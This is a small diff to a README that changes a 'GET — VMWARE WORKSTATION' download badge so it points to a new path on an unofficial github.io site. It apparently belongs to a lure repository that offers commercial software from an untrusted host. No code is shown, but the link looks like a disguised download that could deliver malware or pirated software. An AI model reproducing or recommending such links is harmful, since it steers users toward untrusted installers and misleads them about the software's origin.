@@ -4,7 +4,7 @@
 <img src="https://www.virtualhome.blog/wp-content/uploads/2019/12/vmware_workstation_logo.png" width="400">
 </p>
 
-[![GET — VMWARE WORKSTATION](https://img.shields.io/badge/GET-VMWARE%20WORKSTATION-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/)
+[![GET — VMWARE WORKSTATION](https://img.shields.io/badge/GET-VMWARE%20WORKSTATION-2563eb?style=for-the-badge)](https://pribbledriveparter.github.io/.github/VMware)
 
 ---
 
